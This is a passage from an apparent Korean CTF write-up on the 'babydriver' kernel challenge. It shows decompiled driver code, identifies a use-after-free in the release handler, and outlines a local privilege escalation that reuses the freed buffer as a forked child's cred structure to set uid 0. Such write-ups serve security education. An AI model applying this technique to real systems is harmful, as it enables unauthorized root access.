+<h3 id="4-2-3-qemu-설치"><a href="#4-2-3-qemu-설치" class="headerlink" title="4.2.3. qemu 설치"></a>4.2.3. qemu 설치</h3><p><code>boot.sh</code>를 실행시키기 위해 <code>qemu</code>를 설치한다.</p>
+<p>분석을 진행한 환경이 <code>x86-64</code>이므로 아래의 명령어를 이용해 <code>qemu</code>를 설치해주었다. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install qemu-system-x86 </span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="4-3-문제-풀이-및-분석"><a href="#4-3-문제-풀이-및-분석" class="headerlink" title="4.3. 문제 풀이 및 분석"></a>4.3. 문제 풀이 및 분석</h2><h3 id="4-3-1-boot-sh-확인"><a href="#4-3-1-boot-sh-확인" class="headerlink" title="4.3.1. boot.sh 확인"></a>4.3.1. boot.sh 확인</h3><p>우선 <code>boot.sh</code>를 살펴보자.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd ./test/rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
+
+<p>해당 코드를 살펴보면, <code>smep</code>이 걸려있는 걸 알 수 있다. 이는 user 공간에서 kernel 영역의 함수를 실행하지 못하게 하는 보호 기법이다. </p>
+<p><code>kaslr</code>은 걸려있지 않다는 것 또한 확인할 수 있었다. </p>
+<br>
+
+<h3 id="4-3-2-문제-풀이-아이디어"><a href="#4-3-2-문제-풀이-아이디어" class="headerlink" title="4.3.2. 문제 풀이 아이디어"></a>4.3.2. 문제 풀이 아이디어</h3><p><code>boot.sh</code>로 부팅을 하면 ctf 권한을 가진 상태로 부팅이 된다.</p>
+<p><img src="/images/monthly_24_05_image5.png" alt="그림 5. [boot.sh 실행]"></p>
+<center><b>그림 5. [boot.sh 실행]<br></center></b><br>
+
+
+<p><code>rootfs/etc</code> 폴더 아래에는 <code>group</code>, <code>init.d</code>, <code>passwd</code>가 존재한다.</p>
+<p><img src="/images/monthly_24_05_image6.png" alt="그림 6. [rootfs/etc에 존재하는 파일]"></p>
+<center><b>그림 6. [rootfs/etc에 존재하는 파일]<br></center></b><br>
+
+<p>그 중 <code>passwd</code> 파일을 살펴보면 root 권한이 존재하는 것을 확인할 수 있었다. </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/sh</span><br><span class="line">ctf:x:1000:1000:chal:/home/ctf:/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>ctf 권한을 root 권한으로 LPE(권한 상승) 하는 것이 문제의 목적이다.</p>
+<p>이제 커널 모듈을 분석해보자.</p>
+<br>
+
+<h3 id="4-3-3-babydriver-ko-분석"><a href="#4-3-3-babydriver-ko-분석" class="headerlink" title="4.3.3. babydriver.ko 분석"></a>4.3.3. babydriver.ko 분석</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v5</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0LL</span>, <span class="number">1LL</span>, <span class="string">&quot;babydev&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    v2 = babydev_no;</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v4 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (class *)_class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v5;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = device_create(v5, <span class="number">0LL</span>, babydev_no, <span class="number">0LL</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line">        v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">          <span class="keyword">return</span> v1;</span><br><span class="line">        printk(&amp;unk_351, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B, <span class="string">&quot;babydev&quot;</span>, v6);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327, v2, v3);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309, <span class="number">0LL</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>babydriver 커널 모듈을 초기화하는 과정으로, 커널에서 모듈을 불러올 때 가장 먼저 실행되는 함수이다.</p>
+<p><code>alloc_chrdev_region()</code> 함수로 Char Device의 번호를 할당한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">babydriver_exit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>모듈이 종료될 때 호출되는 함수이다.</p>
+<p><code>init()</code> 함수에서 할당한 디바이스를 제거하는 함수다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928LL</span>, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">37748928LL</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>open</code>을 하면, 커널에서 동적 할당을 통해 64바이트 만큼 <code>babydev_struct</code> 구조체의 <code>device_buf</code>에 힙을 할당한다.</p>
+<p>그리고 <code>babydev_struct</code> 구조체의 <code>device_buf_len</code> 필드에 크기 64를 <code>buf_len</code> 필드에 저장한다.</p>
+<p><code>kmem_cache_alloc_trace()</code> 함수가 바로 동적 할당 함수이다.</p>
+<p>babydev 구조체는 아래와 같다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">babydevice_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *device_buf;</span><br><span class="line">  <span class="type">size_t</span> device_buf_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>babyread()</code> 함수는 <code>device_buf</code> 필드가 <code>null</code>이면 <code>-1</code>을 반환한다.<br><code>length(v4)</code>와 <code>buf_len</code>을 비교해 <code>buf_len</code>이 더 크면 <code>copy_to_user()</code> 함수를 호출하여 kernel 영역의 테이블을 user 공간인 <code>buffer</code>로 복사한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>read</code> 함수와 마찬가지로 <code>device_buf</code>가 <code>null</code>이면 <code>-1</code>을 반환한다.<br><code>device_buf_len</code>이 <code>v4</code>보다 크면 <code>copy_from_user()</code> 함수를 호출해 user 영역인 buffer 테이블을 kernel 영역으로 복사한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">37748928LL</span>, v5);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    result = <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2번째 인자 <code>command</code>가 <code>0x10001(65537)</code>이면 <code>device_buf</code>를 해제(free)하고 3번째 인자(<code>arg(v4)</code>)만큼 힙을 재할당하여 초기화한다. 이때 힙 영역은 <code>open</code> 시에 할당 받은 힙 영역이다. <code>buf_len</code>도 마찬가지다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>release()</code> 함수는 <code>close()</code> 함수가 호출될 때 호출된다. <code>device_buf</code>를 해제하지만 해제하면서 초기화 작업을 하지는 않는다.<br>해제 후 초기화를 안 하기 때문에 UAF가 발생하게 된다.<br>즉, <strong>Dangling Pointer</strong>(해제된 메모리 영역을 가리키는 포인터)가 된다.</p>
+<br>
+
+<h3 id="4-3-4-struct-cred-이용"><a href="#4-3-4-struct-cred-이용" class="headerlink" title="4.3.4. struct cred 이용"></a>4.3.4. struct cred 이용</h3><p>초기 <code>open()</code> → <code>ioctl()</code> 시에 cred 구조체 사이즈인 168 바이트를 인자로 전달하여 해당 크기의 청크를 할당받게 한다. 그리고 close()를 하면 168 바이트 힙 청크를 가리키는 전역변수에 들어있는 값은 Dangling Pointer가 된다.</p>
+<p>그리고 <code>fork()</code> 함수를 호출하여 <code>fork()</code> 내부에서 힙 할당을 하는 로직을 이용하여 free된 청크(현재 dangling pointer 주소인 청크)를 재할당받는다.</p>
+<p>fork에서 힙을 할당받는 로직은 바로 부모의 pcb 정보 중 cred 구조체 필드들을 복사하기 위함이다.</p>
+<ul>
+<li>danling pointer 만들기</li>
+<li>fork 통해 dangling pointer를 할당받게 하고 (이는 cred 구조체 영역)</li>
+<li>저 영역은 <code>babywrite()</code>를 통해 user 공간의 값을 커널영역으로 복사할 수 있음</li>
+<li>즉, fork에서 할당받은 cred 구조체 영역을 수정 가능하단 소리 → uid부분을 0으로 만들 수 있음</li>
+<li>그 다음 user 영역에서 시스템 함수를 그냥 실행시키면 LPE가 일어남. (단, 이는 fork한 자식 프로세스 내에서 실행해야 함)</li>
+</ul>
+<br>
+
+<h3 id="4-3-5-함수-호출"><a href="#4-3-5-함수-호출" class="headerlink" title="4.3.5. 함수 호출"></a>4.3.5. 함수 호출</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ARCH_WANT_SYS_CLONE</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CLONE_BACKWARDS</span></span><br><span class="line">SYSCALL_DEFINE5(clone, <span class="type">unsigned</span> <span class="type">long</span>, clone_flags, <span class="type">unsigned</span> <span class="type">long</span>, newsp,</span><br><span class="line">		 <span class="type">int</span> __user *, parent_tidptr,</span><br><span class="line">		 <span class="type">unsigned</span> <span class="type">long</span>, tls,</span><br><span class="line">		 <span class="type">int</span> __user *, child_tidptr)</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_CLONE_BACKWARDS2)</span></span><br><span class="line">SYSCALL_DEFINE5(clone, <span class="type">unsigned</span> <span class="type">long</span>, newsp, <span class="type">unsigned</span> <span class="type">long</span>, clone_flags,</span><br><span class="line">		 <span class="type">int</span> __user *, parent_tidptr,</span><br><span class="line">		 <span class="type">int</span> __user *, child_tidptr,</span><br><span class="line">		 <span class="type">unsigned</span> <span class="type">long</span>, tls)</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_CLONE_BACKWARDS3)</span></span><br><span class="line">SYSCALL_DEFINE6(clone, <span class="type">unsigned</span> <span class="type">long</span>, clone_flags, <span class="type">unsigned</span> <span class="type">long</span>, newsp,</span><br><span class="line">		<span class="type">int</span>, stack_size,</span><br><span class="line">		<span class="type">int</span> __user *, parent_tidptr,</span><br><span class="line">		<span class="type">int</span> __user *, child_tidptr,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span>, tls)</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">SYSCALL_DEFINE5(clone, <span class="type">unsigned</span> <span class="type">long</span>, clone_flags, <span class="type">unsigned</span> <span class="type">long</span>, newsp,</span><br><span class="line">		 <span class="type">int</span> __user *, parent_tidptr,</span><br><span class="line">		 <span class="type">int</span> __user *, child_tidptr,</span><br><span class="line">		 <span class="type">unsigned</span> <span class="type">long</span>, tls)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> _do_fork(clone_flags, newsp, <span class="number">0</span>, parent_tidptr, child_tidptr, tls);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<p>권한 상승을 위해 <code>fork()</code> 함수를 호출해야 하는데 이를 호출하면 시스템 콜 <code>clone()</code> 함수를 호출하여 사용 처리가 된다.</p>
+<p><code>clone()</code> 내부에서는 <code>do_fork()</code> 함수를 호출한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> _do_fork(<span class="type">unsigned</span> <span class="type">long</span> clone_flags,</span><br><span class="line">	      <span class="type">unsigned</span> <span class="type">long</span> stack_start,</span><br><span class="line">	      <span class="type">unsigned</span> <span class="type">long</span> stack_size,</span><br><span class="line">	      <span class="type">int</span> __user *parent_tidptr,</span><br><span class="line">	      <span class="type">int</span> __user *child_tidptr,</span><br><span class="line">	      <span class="type">unsigned</span> <span class="type">long</span> tls)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span> <span class="title">vfork</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pid</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="type">int</span> trace = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> nr;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Determine whether and which event to report to ptracer.  When</span></span><br><span class="line"><span class="comment">	 * called from kernel_thread or CLONE_UNTRACED is explicitly</span></span><br><span class="line"><span class="comment">	 * requested, no event is reported; otherwise, report if the event</span></span><br><span class="line"><span class="comment">	 * for the type of forking is enabled.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(clone_flags &amp; CLONE_UNTRACED)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (clone_flags &amp; CLONE_VFORK)</span><br><span class="line">			trace = PTRACE_EVENT_VFORK;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((clone_flags &amp; CSIGNAL) != SIGCHLD)</span><br><span class="line">			trace = PTRACE_EVENT_CLONE;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			trace = PTRACE_EVENT_FORK;</span><br><span class="line">		<span class="keyword">if</span> (likely(!ptrace_event_enabled(current, trace)))</span><br><span class="line">			trace = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	p = copy_process(clone_flags, stack_start, stack_size,</span><br><span class="line">			 child_tidptr, <span class="literal">NULL</span>, trace, tls, NUMA_NO_NODE);</span><br><span class="line">	add_latent_entropy();</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(p))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(p);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>이는 <code>do_fork()</code> 함수이다. 이 함수에서는 <code>copy_process()</code> 함수를 호출한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PROVE_LOCKING</span></span><br><span class="line">	DEBUG_LOCKS_WARN_ON(!p-&gt;hardirqs_enabled);</span><br><span class="line">	DEBUG_LOCKS_WARN_ON(!p-&gt;softirqs_enabled);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	retval = -EAGAIN;</span><br><span class="line">	<span class="keyword">if</span> (<span class="type">atomic_read</span>(&amp;p-&gt;real_cred-&gt;user-&gt;processes) &gt;=</span><br><span class="line">			task_rlimit(p, RLIMIT_NPROC)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;real_cred-&gt;user != INIT_USER &amp;&amp;</span><br><span class="line">		    !capable(CAP_SYS_RESOURCE) &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">			<span class="keyword">goto</span> bad_fork_free;</span><br><span class="line">	&#125;</span><br><span class="line">	current-&gt;flags &amp;= ~PF_NPROC_EXCEEDED;</span><br><span class="line">	retval = copy_creds(p, clone_flags);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> bad_fork_free;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If multiple threads are within copy_process(), then this check</span></span><br><span class="line"><span class="comment">	 * triggers too late. This doesn&#x27;t hurt, the check is only there</span></span><br><span class="line"><span class="comment">	 * to stop root fork bombs.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	retval = -EAGAIN;</span><br><span class="line">	<span class="keyword">if</span> (nr_threads &gt;= max_threads)</span><br><span class="line">		<span class="keyword">goto</span> bad_fork_cleanup_count;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><code>copy_process()</code> 함수이다.</p>
+<p><code>task_struct</code>를 인자로 <code>copy_creds()</code> 함수를 호출한다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">copy_creds</span><span class="params">(<span class="keyword">struct</span> task_struct *p, <span class="type">unsigned</span> <span class="type">long</span> clone_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line">	<span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">		!p-&gt;cred-&gt;thread_keyring &amp;&amp;</span><br><span class="line"><span class="meta">#<span 